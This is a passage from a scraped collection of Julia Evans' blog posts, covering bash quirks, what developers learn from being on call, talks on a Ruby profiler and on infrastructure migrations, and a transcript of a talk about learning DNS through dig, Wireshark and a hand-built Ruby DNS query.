https://github.com/mvdan/sh . \n\n bash is weird but it’s possible to remember some of the quirks \n\n I think those are all the basic bash quirks I know! I suppose it is possible to\nrant about how bash is a Terrible Programming Language that you shouldn’t be\nusing and why don’t we have a shell programming language that is less\nconfusing, but it doesn’t bother me too much. \n\n I just try to not write very complicated bash scripts, stick to some of the\nbest practices here, and don’t worry too much about it. And it’s kind of\ninteresting to learn about the weird quirks, anyway! \n\n If you liked this, people linked me to a bunch of other bash resources which I\nwill share with you now \n\n \n defensive bash programming \n shell scripting style guide from Google . \n advanced bash programming guide from TLDP \n this  bash guide  and  extensive bash FAQ \n a  command line challenge game  to test your bash abilities \n again,  shellcheck  and  shfmt \n \n\n (if we’re talking about alternative shells, though – the shell I actually use\nday to day is  fish . Fish is wonderful and I love it because of its  amazing autocomplete . But I still generally write shell scripts in bash.) \n\n  thanks to Mat, Marina, Kamal, Geoffrey, Panashe, @gnomon, and Iain for talking about Bash with me!   \n\n"},
{"url": "https://jvns.ca/blog/2017/06/18/operate-your-software/", "title": "What can developers learn from being on call?", "content": "\n     \n\n We often talk about being on call as being a bad thing. For example, the night\nbefore I wrote this my phone woke me up in the middle of the night because\nsomething went wrong on a computer. That’s no fun! I was grumpy. \n\n In this post, though, we’re going to talk about what you can learn from being\non call and how it can make you a better software engineer!. And to learn from\nbeing on call you don’t necessarily need to get woken up in the middle of the\nnight. By “being on call”, here, I mean “being responsible for your code when\nit breaks”. It could mean waking up to issues that happened overnight and\nneeding to fix them during your workday! \n\n Everything in here is synthesized from an amazing Twitter thread by Charity Majors where she asked “How has being on call made you a better engineer?”:  https://twitter.com/mipsytipsy/status/847508734188191745 \n\n Learn what kinds of production problems are common and uncommon \n\n When you’re designing a system, you need to design for its error cases! When I\nwas just starting out as an engineer, I found coming up with error cases really\nhard. ANYTHING could go wrong! But it’s important to have a better model of\nsystem failure than “anything could go wrong, protect against everything!”\nbecause often you have to prioritize where to spend your time, and you should\nspend your time worrying about edge cases that are actually likely to happen. \n\n Being on call can teach you very fast what kinds of edge cases your system runs\ninto frequently! \n\n For example, after seeing some software fail, I know that DNS queries can fail.\nIt’s useful to have error handling for DNS queries (and network requests in\ngeneral), even if you think the servers you’re talking to are mostly reliable! \n\n I also know that in principle RAM can be faulty (when you set a value in memory, it can get set to something else!) but it’s not something that’s ever happened to me in practice (yet!) so I worry about it less. (this might be because servers use ECC memory?) This post  Exploiting the DRAM rowhammer bug to gain kernel privileges  is a good example about how you can use RAM being faulty to make an exploit. \n\n Learn to build in monitoring and diagnostics early \n\n There’s nothing quite like a system breaking, being in charge of fixing it, and\nhaving no way of seeing what’s wrong to convince you of the value of building\nmonitoring and logging into your application. \n\n Being on call will teach you quickly what  kinds  of diagnostics you need to\ndebug your application. If you get paged because your application is taking an\nabnormally long time to make database queries, you can start monitoring how\nlong your database queries take! Then next time it’ll be much easier for the\nperson on call to see if that’s the problem. \n\n The great thing about this is that these lessons last even beyond your current\non-call rotations – you can notice “hey, every time I write a program I end up\nlogging how long its database queries take, I’ll just put that in at the\nbeginning this time!” \n\n Understand the parts of the system that aren’t yours \n\n It’s easy to think of the parts of the system you don’t own as a black box. “I\njust make database queries and they work, it’s fine, the database team is in\ncharge of the database”. \n\n But it’s actually incredibly useful to have a basic understanding of the\nlimitations of the systems you work with! If you’re working on the backend for\na web application, you want to know how many queries it’s okay to make to your\ndatabase, approximately how much network bandwidth you have to work with, how\nmuch it’s okay to write to disk, and more. \n\n If you get paged because your application is making too many database queries,\nthis is an awesome opportunity to learn more about the limitations of the\ndatabase you use! And then (can you see a pattern here?) the next time you work\non something that makes a lot of database queries, you can check up front to\nmake sure that it’s okay. \n\n Gain confidence in your judgement \n\n A couple great quotes from this thread: \n\n \n It helped me gain confidence in my own judgment. You have to make big calls, take scary actions, live through terrible decisions. \n\n I stop second guessing myself. If I’m getting paged, shits down and broken hard - no time to second guess yourself. \n \n\n Learn what needs urgent attention \n\n Some problems need to be fixed RIGHT NOW, and other problems… really don’t.\nIt used to be really mysterious to me how some engineers could just tell you\n“yeah, that’s not a big deal” and be.. right about it? \n\n This intuition is really important to build (otherwise you’ll panic every time\nthere’s an error and you’ll never get anything done!). When you’re on call for\na system, you see the urgent problems when they happen and you understand what\ncauses them. So you slowly gain intuition for “oh, okay, when X happens it\noften causes a serious issue, but when Y happens it’s not a big deal”. \n\n This also lets you prevent upcoming problems proactively – if you see\nsomething worrisome happening, you can fix it before anyone on your team has to\nbe woken up in the middle of the night. \n\n Learn to design reliable systems \n\n There’s been a common thread through all of this. A huge part of our jobs as\nsoftware engineers is to design systems that continues working for your\ncustomers even when things don’t happen quite as your expected. A great way to\nlearn how to design for failure is to be on call for your software. \n\n Kamal pointed out to me that it’s easy to have a system where the code is fine\n(not too many bugs, etc), but because of some fundamental design choice it\ndoesn’t run well in production. For example, you could design a system which\nneeds to make many database queries every time a user makes a request. So\nhaving a good understanding of the production implications of different design\nchoices will help you design better systems! \n\n Learn how to make minimum effective change \n\n When there’s an\n incident , you want to\nstabilize the system before fixing the root cause (ok, this server is on FIRE,\ncan we just divert traffic away from it before figuring out why?)! This is a\nuseful skill when you’re being paged, but also when you have a system that\nneeds help but don’t necessarily have the time/resources to completely fix it\nright now. \n\n Learn about distributed systems & consistency & race conditions \n\n \n Being on call has taught me about race conditions \n \n\n Recently I got an alert that a job I’d written was failing. I looked at it for\na while, and then I realized “oh, this is happening because S3 list operations\nare eventually consistent” – my code was listing a prefix in S3, and the\nresult it was getting wasn’t up to date. (and “eventually consistent” here\nreally means “eventually” – apparently sometimes you’ll add / delete an object\nfrom an S3 bucket and it won’t show up in list operations for minutes) \n\n This is how S3 is  supposed  to work, but I hadn’t really thought about that\nwhen I wrote the code.  Arguably I should have read the docs more carefully,\nbut seeing issues like this in practice helps me understand what “eventually\nconsistent” systems look like when they fail and remember to write my code with\nthat in mind next time. \n\n Other quotes I liked \n\n \n I’ve had teams that took on-call very seriously: each issue that paged\nus was reviewed in a weekly meeting, and tasks were assigned to solve \n\n The lesson for me is that processes are important, and working towards\ncontinuous improvement is worth it. \n \n\n and \n\n \n Being on call means I can’t pick and choose favorite/comfortable subjects\navoiding hard/unhappy ones. I’m forced to stretch and learn. \n \n\n and \n\n \n Being able to put aside one’s pride and say “I need help with this\neven though I’m waking someone up to help me.” \n \n\n and \n\n \n It made me much better at figuring out how to break up a complex\nfailure condition into smaller pieces that are easier to debug… \n \n\n Being responsible for my programs’ operations makes me a better developer \n\n I’ve never really worked in a world where I wrote software and threw it over\nthe wall to be operated by another team. But I do feel like writing software\nand then seeing how it fails in practice has been a good experience! I feel\nlike it’s a great privilege to be able to write software and see how it\nholds up in practice over the course of months/years. \n\n That said – I’ve never been on a particularly arduous on-call rotation\npersonally, the most I’ve probably ever been paged is like.. 2-3 times per\nweek, once every 4 weeks. But I feel like I learned a lot from that still! \n\n I’ve probably left out many important things here but I wrote this 2 months ago\nand so it’s already being published far later than my usual “write this and\npublish it within 4 hours”. \n\n"},
{"url": "https://jvns.ca/blog/2018/09/18/build-impossible-programs/", "title": "Build impossible programs", "content": "\n     \n\n Hello! My talk from Deconstruct this year ( “Build impossible programs” ) is up. It’s about my\nexperience building a Ruby profiler. This is the second talk I’ve given about building a profiler – the first one ( Building a Ruby profiler ) was more of a tech deep dive. This one is a squishier talk about myths I believed about doing ambitious work and how a lot of those myths turn out not to be true. \n\n There’s a  transcript on Deconstruct’s\nsite . They’re\nalso gradually putting up  the other talks from Deconstruct\n2018 , which were generally excellent. \n\n video \n\n \n\n slides \n\n As usual these days I drew the slides by hand. It’s way easier/faster, and it’s more fun. \n\n \n\n zine side note \n\n One extremely awesome thing that happened at Deconstruct was that Gary agreed to print 2300 zines to\ngive away to folks at the conference. They all got taken home which was really nice to see :) \n\n"},
{"url": "https://jvns.ca/blog/2018/12/15/new-talk--high-reliability-infrastructure-migrations/", "title": "New talk: High Reliability Infrastructure Migrations", "content": "\n     \n\n On Tuesday I gave a talk at KubeCon called  High Reliability Infrastructure\nMigrations . The abstract was: \n\n \n For companies with high availability requirements (99.99% uptime or higher), running new software\nin production comes with a lot of risks. But it’s possible to make significant infrastructure\nchanges while maintaining the availability your customers expect! I’ll give you a toolbox for\nderisking migrations and making infrastructure changes with confidence, with examples from our\nKubernetes & Envoy experience at Stripe. \n \n\n video \n\n \n\n slides \n\n Here are the slides: \n\n \n\n since everyone always asks, I drew them in the Notability app on an iPad. I do this because it’s\nfaster than trying to use regular slides software and I can make better slides. \n\n a few notes \n\n Here are a few links & notes about things I mentioned in the talk \n\n skycfg: write functions, not YAML \n\n I talked about how my team is working on non-YAML interfaces for configuring Kubernetes. The demo is\nat  skycfg.fun , and it’s  on GitHub here . It’s based on\n Starlark , a configuration language that’s a subset of\nPython. \n\n My coworker  John  has promised that he’ll write a blog post about it at\nsome point, and I’m hoping that’s coming soon :) \n\n no haunted forests \n\n I mentioned a deploy system rewrite we did. John has a great blog post about when rewrites are a\ngood idea and how he approached that rewrite called  no haunted\nforests . \n\n ignore most kubernetes ecosystem software \n\n One small point that I made in the talk was that on my team we ignore almost all software in the\nKubernetes ecosystem so that we can focus on a few core pieces (Kubernetes & Envoy, plus some small\nthings like kiam). I wanted to mention this because I think often in Kubernetes land it can seem\nlike everyone is using Cool New Things (helm! istio! knative! eep!). I’m sure those projects are\ngreat but I find it much simpler to stay focused on the basics and I wanted people to know that it’s\nokay to do that if that’s what works for your company. \n\n I think the reality is that actually a lot of folks are still trying to work out how to use this new\nsoftware in a reliable and secure way. \n\n other talks \n\n I haven’t watched other Kubecon talks yet, but here are 2 links: \n\n I heard good things about  this keynote from melanie cebula about kubernetes at airbnb , and I’m excited to see  this talk about kubernetes security . The  slides from that security talk look useful \n\n Also I’m very excited to see Kelsey Hightower’s keynote as always, but that recording isn’t up yet. If you\nhave other Kubecon talks to recommend I’d love to know what they are. \n\n my first work talk I’m happy with \n\n I usually give talks about debugging tools, or side projects, or how I approach my job at a high\nlevel – not on the actual work that I do at my job. What I talked about in this talk is basically\nwhat I’ve been learning how to do at work for the last ~2 years. Figuring out how to make big\ninfrastructure changes safely took me a long time (and I’m not done!), and so I hope this talk helps\nother folks do the same thing. \n\n"},
{"url": "https://jvns.ca/blog/2023/05/08/new-talk-learning-dns-in-10-years/", "title": "New talk: Learning DNS in 10 years", "content": "\n     \n\n Here’s a keynote I gave at  RubyConf Mini  last year: Learning DNS in 10 years.\nIt’s about strategies I use to learn hard things. I just noticed that they’d\nreleased the video the other day, so I’m just posting it now even though I gave\nthe talk 6 months ago. \n\n Here’s the video, as well as the slides and a transcript of (roughly) what I\nsaid in the talk. \n\n the video \n\n \n\n the transcript \n\n \n.container{\n  display:flex;\n}\n.slide {\n  width:40%;\n  border-bottom: 2px #ccc dashed;\n  padding: 10px 0px;\n}\n\n.slide img {\n  width: 100%;\n}\n.content{\n  width:60%;\n  align-items:center;\n  padding:20px;\n}\n@media (max-width: 480px) \n{\n  .container{\n    display:block;\n  }\n  .slide, .content {\n    width:100%;\n  }\n}\n \n\n \n \n \n \n \n \n \n\n \n \n \n \n \nYou all got this zine ( How DNS Works ) in your swag bags -- thanks to RubyConf for printing it!\n\n\n \n \n\n \n \n \n \n \nBut this talk is\nnot really about DNS. I mean, this is a Ruby conference, right? So this talk is\nreally about learning hard things, and DNS is an example of something that was\nhard for me to learn.  \n \n\n \n \n \n \n \nIt took me maybe 16 years from the first time\nthat like I bought a domain name and set up my DNS records to when I really\nfelt like I understood how the system worked.\n\n \n \n\n \n \n \n \n \nAnd one thing I want to say at the beginning of this talk, is that I think that\ntaking like 16 years to learn something like DNS is kind of normal. The idea\nthat \"I should understand this already\" is a bit silly. For me, I was doing\nother stuff for most of the 16 years! There was other stuff I wanted to learn.\n \n \n\n \n \n \n \n \nAnd so, this talk is not about how you should learn about any particular\nthing. I don't care if you learn how DNS works! It's really about how to\napproach learning something hard that's a priority for you to learn.\n \n \n\n \n \n \n \n \n \nSo, we're going to talk about learning through\na series of tiny deep dives. My favorite way of learning things is to do\nnothing, most of the time. \n \n\n \nThat's why it takes 10 years.\n \n\n \nSo for six months I'll do nothing and then like I'll furiously learn something\nfor maybe 30 minutes or three hours or an afternoon. And then I'll declare\nsuccess and go back to doing nothing for months. I find this works really well\nfor me.\n \n\n\n\n\n \n \n\n \n \n \n \n \n \nHere are some of the strategies we're going to talk about for doing these tiny deep dives\n \n\n \nFirst, we're going to start briefly by talking about what DNS is.\n \n\n\n \nNext, we're going to talk about spying on DNS.\n \n \nThen we're gonna talk about being confused, which is my main mode. (I'm always confused about something!)\n \n \nThen we'll talk about reading the specification, we'll going to\ndo some experiments, and we're going to implement our own terrible version\nof DNS.\n \n \n \n\n \n \n \n \n \nAnd so what's DNS really briefly? DNS stands for the Domain Name System. And\nevery time you go to a website like  www.example.com , your browser\nneeds to look up that website's IP address. So DNS translates\ndomain names into IP addresses. It looks up other information about domain\nnames too, but we're mostly just going to talk about IP addresses today.\n\n \n \n\n \n \n \n \n \nI want to briefly sell why I think DNS is cool, because we're going to be\ntalking about it a lot. \n \n \n\n \n \n \n \n \nOne cool thing about DNS is that it's this invisible system that controls the\nentire internet.\n \n \n\n \n \n \n \n \n \nFor example, you're on your phone, you're using Google Maps, it needs to know,\nwhere is maps.google.com, right? Or on your\ncomputer, where's reddit.com? What's the IP address? And if we\ndidn't have DNS, the entire internet\nwould collapse. \n \n\n \nI think it's fun to learn how this behind the scenes stuff works. \n \n\n \n \n\n \n \n \n \n \n\n \nThe other thing about DNS I find interesting is that it's really old. There's\nthis document ( RFC\n1035 ) which defines how DNS works, that was written in 1987. And if\nyou take that document and you write a program that works\nthe way that documents says to work, your program will work. And I think\nthat's kind of wild, right? \n \n\n\n \nThe basics haven't changed since before I was born. So if you're a little slow\nabout learning about it, that's ok: it's not going to change out from under\nyou.\n \n\n \n \n\n \n \n \n \n \nNext I want to talk about spying on DNS, which is one of my favorite ways to\nlearn about things. \n \n \n\n \n \n \n \n \nI'm going to talk about two spy tools for DNS: dig and wireshark.\n \n \n\n \n \n \n \n \ndig is a tool for making DNS queries. We talked about you know, how your\nbrowser needs to look up the IP address for  maps.google.com . We\ncan do that in dig!\n \n \n\n \n \n \n \n \nWhen we run  dig maps.google.com , it prints out 5 fields.  Let's\ntalk about what those 5 fields are.\n \n \n\n \n \n \n \n \n \nI've used example.com instead of maps.google.com on this slide, but the fields\nare the same. Let's talk about 4 of them:\n \n\n  We have the domain name, no big deal  \n  The Time To Live, which is how long to cache that record for so this is a one day  \n  You have the record type, A stands for address because this is an IP address  \n  And you have the content, which is the IP address  \n\n \n \n\n \n \n \n \n \nBut I think that the funniest field in a DNS record\nis this field in the middle, IN, which stands for INternet. I guess in 1987, they thought that we might be on a lot of\ndifferent networks. So they made an option for it. In reality, we're all on the\ninternet. And every DNS query has class set to \"internet\". There are a couple of\nothers query classes (CHAOS and HESIOD), which truly almost nobody uses.\n \n \n\n \n \n \n \n \nWe can also kind of poke around on the\ninternet with Dig. We've talked about A records to look up IP addresses. \n \n \n\n \n \n \n \n \n \nBut there are\nother kinds of records like TXT records. So we're going to look at a TXT record\nreally quickly just because I think this is very fun. We're going to look at twitter.com's TXT records.\n \n\n \nSo TXT records are something that people use for domain verification, for\nexample to prove to Google that you own twitter.com. \n \n\n \nSo what you can do is you can set this DNS\nrecord  google-site-verification . Google will tell you what to set\nit to, you'll set it, and then Google will believe you.\n \n\n \nI think it's kind of fun that you can\nlike kind of poke around with DNS and see that Twitter is using\nMiro or Canva or Mixpanel, that's all public. It's like a little peek into what\npeople are doing inside their companies\n \n\n\n \n \n\n \n \n \n \n \n \nOh, the other thing about dig is that by default, dig's output looks like\nthis, which is very ugly and unreadable. There's a lot of nonsense here.\n\n \n \n\n \n \n \n \n \n\nSo dig has a configuration file, where you can put  +noall +answer   and\nthen your dig responses look much nicer (like they did in the screenshots\nabove) instead of having a lot of nonsense in them. Whenever possible, I try to\nmake my tools behave in a more human way.\n \n \n\n \n \n \n \n \nThe other thing I want to talk about is Wireshark, which\nis my favorite computer networking tool in the universe for spying on \nall things computer networks. In this case, DNS queries. So let's go look at\nWireshark.\n \n \n\n \n \n \n \n \n \n \n\n \n \n \n \n \nWhen we make a DNS query like this and look up example.com, Wireshark can capture it.\n \n \n\n \n \n \n \n \nWhen you \nstart looking in the guts of things, I think it can be a bit scary at first. Like\nwhat do all these numbers? It kind of seems\nlike a lot. So when I'm looking at something new, I try to start by looking at stuff\nthat I understand. \n \n \n\n \n \n \n \n \nFor example, I know that example.com is a domain name,\nright? So we should able to use Wireshark to go find that domain name in the\nDNS query. If we click into the \"query\" part of the DNS packet, we can see 3\nfields that we recognize. First, the domain name.\n \n \n\n \n \n \n \n \nWe can also see the type (\"A\")\n \n \n\n \n \n \n \n \nAnd the third one is the class which\nis INternet, which is always the same. What I find comforting here is that in\nthe query, there are really only 2 important fields: a DNS query is just saying \"I want\nthe IP address for example.com\". There's just two fields. And that that always\nmakes me feel a little bit better about understanding something. \n \n \n\n \n \n \n \n \nA quick caveat: your browser might be using encrypted DNS and spying on your\nDNS queries with Wireshark will not work if your DNS is encrypted. But there's\nlots of non-encrypted DNS to spy on.\n \n \n\n \n \n \n \n \nThe second thing I want to talk about for learning new things is to\nnotice when you're confused about something.\n \n \n\n \n \n \n \n \n\nI want to tell you a story, \"the case of the mysterious caching\", of something\nthat happened to me with DNS that really confused me.\n \n \n\n \n \n \n \n \n\nFirst, I want to talk to you a little\nbit about how DNS works a little bit more. So on the left here, you have your\nbrowser. And when your browser makes a DNS query, it asks a server called a\nresolver. And all you need to know about the resolver is that it's cache, which\nas we know is like the worst thing in computer science. So the resolver is a cache,\nand it gets its information from the source of truth, which has the real answers.\n \n \n\n \n \n \n \n \nSo your browser talks to a resolver, which is a cache.\n \n \n\n \n \n \n \n \nAt the time of this story, I had this mental model for like how I thought about\nDNS, which is that if I set a TTL (the cache time) of 5 minutes when configuring my DNS records,\nthen I would never have to wait more than five minutes. Something you need to\nknow about me is that I'm a very impatient person. And I hate waiting. So this\nmodel was mostly working for me at the time, though there are a few other very\nimportant caveats that we're not going to get into.\n \n \n\n \n \n \n \n \n\nBut one day I was setting up a new subdomain for some new project. Let's say it\nwas new.jvns.ca. So I set it up. I made its DNS records, and I refreshed the\npage. And it wasn't working. So I figured, that's fine, my model says, I only\nhave to wait five minutes, right? Because that's what I was used to. But I\nwaited five minutes and still didn't work.\n \n \n\n \n \n \n \n \nAnd I was like, oh, no. My mental model was broken! I did not feel good.\n \n \n\n \n \n \n \n \n\nAnd often when this happens to me, and I think for most of us, if something\nweird happens with a computer, you let it go, right? You might decide okay, I\ndon't have time to go into a deep investigation here. I'll just wait longer. \n \n \n\n \n \n \n \n \nBut sometimes I\nhave a lot of energy, and maybe I'm feeling mad, like \"the computer\ncan't beat me today\"! Because there's a reason that this is happening, right? And I\nwant to find out what it is. So this day for some reason. I had a lot\nof energy. \n \n \n\n \n \n \n \n \nSo I started Googling furiously. And I found a useful comment on Stack\nOverflow.\n \n \n\n \n \n \n \n \nThe Stack Overflow comment talked about something called negative caching.\nWhat's that?\n \n \n\n \n \n \n \n \n\n \nAnd so here's what it said might be going on. The first time I opened the\nwebsite (before the DNS records had been set up), the DNS servers returned a\nnegative answer, saying hey,this domain doesn't exist yet. The code for that is\nNXDOMAIN, which is like a 404 for DNS.\n \n\n \nAnd the resolver cached that negative NXDOMAIN response. So the fact that it\ndidn't exist was cached.\n \n \n \n\n \n \n \n \n \nSo my next question was: how long do I have to wait for the cache to expire? \nThis brings us to a another learning technique.\n \n \n\n \n \n \n \n \n\nI think like maybe the\nmost upsetting learning technique to me is to read a very boring\ntechnical document. I'm like very impatient. I kind of hate\nreading boring things. And so when I read something very boring, I like to\nbring a specific question. So in this case, I had a specific question, which is\nhow long do I have to wait for the cache to expire?\n \n \n\n \n \n \n \n \n \nIn networking, everything has a specification. The boring technical documents\nare called RFC is for request for comments. I find this name a bit funny,\nbecause for DNS, some of the main RFCs are RFC 1034 and 1035. These were written in 1987,\nand the comment period ended in 1987. You can definitely no longer make\ncomments. But anyway, that's what they're called.\n \n\n \nI personally kind of love\nRFCs because they're like the ultimate answer to many questions. There's a\ngreat series of HTTP RFCs, 9110 to 9114. DNS actually has a million\ndifferent RFCs, it's very upsetting, but the answers are often there. So I went\nlooking. And I think I went looking because when I read comments on\nStackOverflow, I don't always trust them. How do I know if they're accurate? So\nI wanted to go to an authoritative source.\n \n \n \n\n \n \n \n \n \nSo I found this document called RFC 2308. In section 3, it has this very boring\nsentence, the TTL of this record is set to the minimum of the minimum field of the\nSOA record and the TTL of the SOA itself. It indicates how long a resolver may\ncache the negative answer. \n \n \n\n \n \n \n \n \n \nSo, um, ok, cool. What does that mean, right? Luckily, we only have one\nquestion: I don't need to read the entire boring document. I just need to like\nanalyze this one sentence and figure it out.\n \n\n \nSo it's saying that the cache time depends on two fields. I want to show you\nthe actual data it's talking about, the SOA record.\n \n \n \n\n \n \n \n \n \n\nLet's look at what happens when we run  dig +all asdfasdfasdfasdfasdf.jvns.ca \n\nIt says that the domain doesn't exist, NXDOMAIN. But it also returns this\nrecord called the SOA record, which has some domain metadata. And there are two\nfields here that are relevant.\n\n \n \n\n \n \n \n \n \n\n \nHere. I put this on a slide to try to make it a little bit clearer. This slide\nis a bit messed up, but there's this field at the end that's called the MINIMUM\nfield, and there's the TTL, time to live of the record, that I've tried to\ncircle.\n \n\n \nAnd what it's saying is that if a record doesn't exist, the amount of time the\nresolver should cache \"it doesn't exist\" for is the minimum of those two numbers.\n \n \n \n\n \n \n \n \n \n\nIn this case, both of those numbers are 10800. So that's how long have to\nwait. We have to wait 10,800 seconds. That's 3 hours.\n \n \n\n \n \n \n \n \n\n \nAnd so I waited three hours and then everything worked. And I found this\nkind of fun to know because often like if you look up DNS advice it will\nsay something like, if something has gone wrong, you need to wait 48 hours. And I\ndo not want to wait 48 hours! I hate waiting. So I love it when I\ncan like use my brain to figure out that I can wait for less time.\n \n\n \n \n\n \n \n \n \n \n\n\n Sometimes when I find my mental model is broken, it feels like I don't know\nanything \n\n \nBut in this case, and I think in a lot of cases, there's often just a few\nthings I'm missing? Like this negative caching thing is like kind of weird, but\nit really was the one thing I was missing. There are a few more important facts about how\nDNS caching works that I haven't mentioned, but I haven't run into more\nproblems I didn't understand since then. Though I'm sure there's something I\ndon't know.\n \n\n\n \nSo sometimes learning one small thing really can solve all your problems.\n \n \n \n\n \n \n \n \n \n\nI want to say briefly that there's a solution to this negative caching problem.\nWe talked about how like if you visit a domain that's nonexistent, it gets\ncached. The solution is if you haven't set up your domain's DNS, don't visit\nthe domain! Only visit it after you set it up. So I've learned to do that and\nnow I almost never have this problem anymore. It's great.\n \n \n\n \n \n \n \n \nThe next thing I want to talk about is doing experiments.\n \n \n\n \n \n \n \n \n\n \nSo let's say we want to do some experiments with caching. \n \n \n \n\n \n \n \n \n \n \nI think most people don't want to make experimental changes to their domain\nnames, because they're worried about breaking something. Which I think is very understandable.\n \n \n \n\n \n \n \n \n \n \n \n\n \n \n \n \n \n\n \nBecause I was really into DNS, I wanted to experiment with DNS. And I also\nwanted other people to experiment with DNS without having to worry about\nbreaking something. So I made this little website with my friend, Marie, called\n Mess with DNS \n \n\n \nThe idea is,  if you don't want to do that DNS experiments on your domain, you\ncan do them on my domain. And if you mess something up, it's my problem, it's\nnot your problem. And there have been no problems, so that's\nfine.\n \n\n \nSo let's use Mess With DNS to do a little DNS experimentation\n \n\n \n \n\n \n \n \n \n \n\nThe way this works is you get a little subdomain. This one is\nchair131.messwithdns.com. And then you can make DNS records on it and try\nthings out. Here we're making a record for test.char131.messwithdns.net, with\ntype A, the IP 7.7.7.7, and TTL 3000 seconds. \n         \n \n\n \n \n \n \n \nWhat we would expect to see is that if we make a query to the resolver, then it\nasks kind of like the source of truth, which we control. And we should expect\nthe resolver to make only one query, because it's cached. So I want to do an\nexperiment and see if it's true that we get only 1 query.\n \n \n\n \n \n \n \n \nSo I'm going to make a few queries for it, with  dig @1.1.1.1 test.chair131.messwithdns.com . \nI've queried it a bunch of times, maybe 10 or 20.\n \n \n\n \n \n \n \n \n\n \nOh, cool. This isn't what I expected to see. This is fun, though, that's great.\nWe made about 20 queries for that DNS record. The server logs all queries it\nreceives, so we can count them.\nOur server got 1, 2, 3, 4, 5, 6, 7, 8 queries. That's kind of fun. 8 is less than 20.\n \n\n \nOne reason I like to do demos live on stage is that sometimes what I what\nhappens isn't exactly what I think will happen. When I do this exact experiment\nat home, I just get 1 query to the resolver.\n \n\n \nSo we only saw like eight queries here. And I assume that this is\nbecause the resolver, 1.1.1.1, we're talking to has more than one\nindependent cache, I guess there are 8 caches. This makes sense to me because\nCloudflare's network is distributed -- the exact machines I'm talking to here\nin Providence are not the same as the ones in Montreal.\n \n \nThis is interesting because it complicates your idea about how caching works a\nlittle bit, right? Like maybe a given DNS resolver actually has like eight\ncaches and which one you get is random, and you're not always talking\nto the same one. I think that's what's going on here.\n \n \n \n\n \n \n \n \n \nWe can also do the same experiment, but ask Google's resolver, 8.8.8.8, instead\nof Cloudflare's resolver.\n \n \n\n \n \n \n \n \nAnd we're seeing a similar thing here to what we saw with Cloudflare, there are\nmaybe 4 independent caches.\n \n \n\n \n \n \n \n \nWe could also do an experiment with negative caching, but no, I'm not going to\ndo this demo. Sorry. I could just see it going downhill. The problem is that\nthere's too many different caches, and I really want there to be one cache, but\nthere's like seven. That's fine, let's move on.\n \n \n\n \n \n \n \n \nNow I'm going to talk\nabout my favorite strategy for learning about stuff, which is to\nwrite my own very bad version of the thing. And I want to say that writing my\nvery bad implementation gives me a really unreasonable amount of confidence. \n \n \n\n \n \n \n \n \nSo you might think that writing DNS software is complicated, right? But it's\neasier than you might think, as long as you keep your expectations low.\n \n \n\n \n \n \n \n \nTo make the DNS queries, the first thing we need to do is we need to\nmake a network connection. Let's do that.\n \n \n\n \n \n \n \n \nThese four lines of Ruby connect to 8.8.8.8, the Google DNS resolver, on UDP\nport 53. Now we're like halfway there. So after we've made a connection, \nwe need to send Google a DNS query. You might be thinking, Julia, I\ndon't know how to write a DNS query.\n \n \n\n \n \n \n \n \nBut there's no problem. We can copy one from something else that knows what a\nDNS query looks like. AKA Wireshark.\n \n \n\n \n \n \n \n \nSo if I right click on this DNS query, it's very small, but I'm clicking on\n\"copy\", and then \"copy as hex stream\".\nYou might not know what this means yet, but this is a DNS query. And\nyou might think that like, Hey, you can't just copy and paste something and\nthen send the exact same thing and it'll reply, but you can. And it works.\n\n \n \n\n \n \n \n \n \n\nHere's what the code looks like to send this hex string we copied and pasted to 8.8.8.8.\n \n \n\n \n \n \n \n \nSo we take this like hex string that we copy and pasted, and paste it into our\ntiny Ruby program, and use `.pack` to convert into a string of bytes and send it.\n \n \n\n \n \n \n \n \nNow we run the Ruby program.\n\n \n \n\n \n \n \n \n \n \nLet's go to Wireshark and look for the packet we just sent. And we can see it there! There's some other noise in between, so I'll stop the capture.\n \n\n \nWe can see that it's the same packet because the query ID matches, B962.\n \n\n \nSo we sent a query to Google the answer server and we got a response right? It\nwas like this is totally legitimate. There's no problem. It doesn't know that we copied and pasted it and that we have no idea what it means!\n \n\n \n \n\n \n \n \n \n \nBut we do want to know what this means, right? And so we'll take this hex string and split it into 2 parts. \nThe first part is the header. And the second part is the\nquestion, which contains the actual domain name we're looking up. \n \n \n\n \n \n \n \n \n\n \nWe're going to see how to construct these in Ruby, but first \nI want to talk about what a byte is for\none second. So this (b9) is the hexadecimal representation of a byte. The way\nI like to look at figure out what that means is just type it into IRB, if\nyou type in 0xB9 it'll print out, that's the number 184.\n \n \nSo the question is 12 bytes\n \n \n \n\n \n \n \n \n \n\nThose 12 bytes correspond\nsix numbers, which are two bytes each. So the first number is the thing\n b962  which is the query ID. The next number is the flags, which\nbasically in this case, means like this is a query like hello, I have a\nquestion. And then there's four more sections, the number of questions and then\nthe number of answers. We do not have any answers. We only have a question. So\nwe're saying, hello, I have one question. That's what the header means.\n \n \n\n \n \n \n \n \n\n \nAnd the way that we can do this in Ruby, is we can make a little array that has the\nquery ID, and then these numbers which\ncorrespond to the other the other header fields, the flags and then 1 for 1\nquestion, and then three zeroes for each of the 3 sections of answers.\n \n\n\n \nAnd then we need to tell Ruby how to take these like six numbers and\nthen represent them as bytes. So n here means each\nof these is supposed to represent it as two bytes, and it also means to use big endian byte order.\n \n\n \n \n\n \n \n \n \n \nNow let's talk about the question.\n \n \n\n \n \n \n \n \n \nI broke up the question section here. There are two parts\nyou might recognize from  example.com : there's example, and com. \nThe way it works is that first you have a number (like 7), and then a\n7-character string, like \"example\". The number tells you how many characters to\nexpect in each part of the domain name. So it's 7, example, 3, com, 0.\n \n\n \nAnd then at the end, you\nhave two more fields for the type and the class. Class 1 is code for\n\"internet\". And type 1 is code for \"IP address\", because we want to look up the\nIP address. is\n \n\n \n \n\n \n \n \n \n \nSo we can write a little bit of code to do this. If we want to translate\nexample.com into seven example three column zero, can like split the domain on\na dot and then like get its length and concatenate that together and put a 0 on\nthe end. It's just a little bit of Ruby. how to encode a domain name. \n \n \n\n \n \n \n \n \nAnd then we can wrap all this up\ntogether where we make a random query ID. And then you make\nthe header, encode the domain name, and then we add the type\nand the class, 1 and 1, and then we can just\nconcatenate everything together and that's our query.\n \n \n\n \n \n \n \n \nThere's definitely more work to do here to print out the response, but I wrote\na 120-line Ruby script that parses the response too, and I want to show you a quick demo of it working.\n \n \n\n \n \n \n \n \n\nWhat domain should we look up>. rubyconfmini.com. All right, let's do it. Hey, it works!  \n \n\n \n \n \n \n \n\nI have a blog post that breaks down the\nwhole thing on my blog,  Making\na DNS query in Ruby from scratch . It talks about how to decode the\nresponse.\n \n \n\n \n \n \n \n \nWe're at the end! Let's do a recap.\n \n \n\n \n \n \n \n 